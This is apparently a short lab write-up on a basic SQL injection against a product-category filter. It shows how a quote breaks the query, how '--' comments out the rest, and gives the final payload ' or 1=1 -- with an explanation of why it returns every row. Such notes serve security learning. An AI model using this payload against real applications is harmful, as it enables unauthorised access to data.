SELECT * FROM products WHERE category = 'Gifts' AND released = 1

when you had change the query to = '
=> SELECT * FROM products WHERE category = '' ' AND released = 1
it breaks the backend

so you add -- after
=> SELECT * FROM products WHERE category = '' --' AND released = 1
doesn't break the app but return nothing

=> SELECT * FROM products WHERE category = '' or 1=1 --

Final PAYLOAD = ' or 1=1 --

Here's the breakdown of what happens:

    SELECT * FROM products: This part of the query selects all columns from the "products" table.
    WHERE category = '' or 1=1: This is the WHERE clause of the query. The condition category = '' is included as the original condition, and 1=1 is included as an additional condition. The 1=1 condition always evaluates to true, effectively making the entire WHERE clause true for all rows.

The double hyphen -- at the end of the query is used to comment out the remainder of the query, ensuring that any characters after it are ignored.

The SQL query SELECT * FROM products WHERE category = '' or 1=1 -- is effectively equivalent to SELECT * FROM products WHERE TRUE, as both conditions will evaluate to true for every row in the table.


BYPASS THE WHERE CONDITION

Final PAYLOAD = ' or 1=1 --
